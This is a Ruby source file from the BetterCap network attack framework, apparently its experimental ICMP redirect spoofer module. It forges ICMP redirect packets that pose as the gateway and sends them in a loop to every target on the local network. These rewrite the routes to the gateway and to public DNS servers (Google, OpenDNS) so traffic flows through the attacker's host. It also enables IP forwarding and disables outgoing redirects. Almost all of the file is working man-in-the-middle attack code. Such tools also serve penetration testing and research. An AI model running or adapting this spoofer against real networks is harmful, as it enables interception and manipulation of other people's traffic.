=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require 'bettercap/spoofers/base'
require 'bettercap/error'
require 'bettercap/context'
require 'bettercap/network'
require 'bettercap/logger'
require 'colorize'

module BetterCap
module Spoofers
# Class to create ICMP redirection packets.
class ICMPRedirectPacket < PacketFu::Packet
    ICMP_REDIRECT = 5
    ICMP_REDIRECT_HOST = 1

    IP_PROTO_ICMP = 1
    IP_PROTO_UDP  = 17

    include PacketFu::EthHeaderMixin
    include PacketFu::IPHeaderMixin
    include PacketFu::ICMPHeaderMixin
    include PacketFu::UDPHeaderMixin

    attr_accessor :eth_header, :ip_header, :icmp_header, :ip_encl_header

    def initialize(args={})
      @eth_header = PacketFu::EthHeader.new(args).read(args[:eth])

      @ip_header          = PacketFu::IPHeader.new(args).read(args[:ip])
      @ip_header.ip_proto = IP_PROTO_ICMP

      @icmp_header           = PacketFu::ICMPHeader.new(args).read(args[:icmp])
      @icmp_header.icmp_type = ICMP_REDIRECT
      @icmp_header.icmp_code = ICMP_REDIRECT_HOST

      @ip_encl_header          = PacketFu::IPHeader.new(args).read(args[:ip])
      @ip_encl_header.ip_proto = IP_PROTO_UDP

      @udp_dummy         = PacketFu::UDPPacket.new
      @udp_dummy.udp_src = 53
      @udp_dummy.udp_dst = 53

      @ip_header.body = @icmp_header
      @eth_header.body = @ip_header

      @headers = [@eth_header, @ip_header, @icmp_header]
      super
    end

    def update!( gateway, target, local, address2redirect )
      @eth_header.eth_src = PacketFu::EthHeader.mac2str(gateway.mac)
      @ip_header.ip_saddr = gateway.ip

      @eth_header.eth_dst = PacketFu::EthHeader.mac2str(target.mac)
      @ip_header.ip_daddr = target.ip

      @udp_dummy.ip_saddr = target.ip
      @udp_dummy.ip_daddr = address2redirect
      @udp_dummy.recalc

      @icmp_header.body = local.split('.').collect(&:to_i).pack('C*') +
                          @udp_dummy.ip_header.to_s

      recalc
    end
end

# This class is responsible of performing ICMP redirect attack on the network.
class Icmp < Base
  # Initialize the BetterCap::Spoofers::Icmp object.
  def initialize
    Logger.warn "!!! 'BetterCap::Spoofers::Icmp' IS AN EXPERIMENTAL MODULE, IT'S NOT GUARANTEED TO WORK !!!\n"

    @ctx          = Context.get
    @forwarding   = @ctx.firewall.forwarding_enabled?
    @gateway      = nil
    @local        = @ctx.ifconfig[:ip_saddr]
    @spoof_thread = nil
    @running      = false
    @entries      = [ '8.8.8.8', '8.8.4.4',                # Google DNS
                      '208.67.222.222', '208.67.220.220' ] # OpenDNS

    Logger.info "Getting gateway #{@ctx.gateway} MAC address ..."

    hw = Network.get_hw_address( @ctx.ifconfig, @ctx.gateway )
    raise BetterCap::Error, "Couldn't determine router MAC" if hw.nil?

    @gateway = Target.new( @ctx.gateway, hw )

    Logger.info "  #{@gateway}"
  end

  # Send ICMP redirect to the +target+, redirecting the gateway ip and
  # everything in the @entries list of addresses to us.
  def send_spoofed_packet( target )
    ( [@gateway.ip] + @entries ).each do |address|
      Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} redirecting #{address} to us ..."

      pkt = ICMPRedirectPacket.new
      pkt.update!( @gateway, target, @local, address )
      pkt.to_w(@ctx.ifconfig[:iface])
    end
  end

  # Start the ICMP redirect spoofing.
  def start
    Logger.info "Starting ICMP redirect spoofer ..."

    stop() if @running
    @running = true

    @ctx.firewall.enable_forwarding(true) unless @forwarding
    @ctx.firewall.disable_send_redirects

    @spoof_thread = Thread.new { icmp_spoofer }
  end

  # Stop the ICMP redirect spoofing, reset firewall state.
  def stop
    raise 'ICMP redirect spoofer is not running' unless @running

    Logger.info 'Stopping ICMP redirect spoofer ...'

    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
    @ctx.firewall.enable_forwarding( @forwarding )

    @running = false
    begin
      @spoof_thread.exit
    rescue
    end
  end

  private

  def icmp_spoofer
    prev_size = @ctx.targets.size
    loop do
      if not @running
          Logger.debug 'Stopping spoofing thread ...'
          Thread.exit
          break
      end

      size = @ctx.targets.size
      if size > prev_size
        Logger.warn "Aquired #{size - prev_size} new targets."
      elsif size < prev_size
        Logger.warn "Lost #{prev_size - size} targets."
      end

      Logger.debug "Spoofing #{@ctx.targets.size} targets ..."

      update_targets!

      @ctx.targets.each do |target|
        unless target.ip.nil? or target.mac.nil?
          send_spoofed_packet target
        end
      end

      prev_size = @ctx.targets.size

      sleep(1)
    end
  end
end
end
end
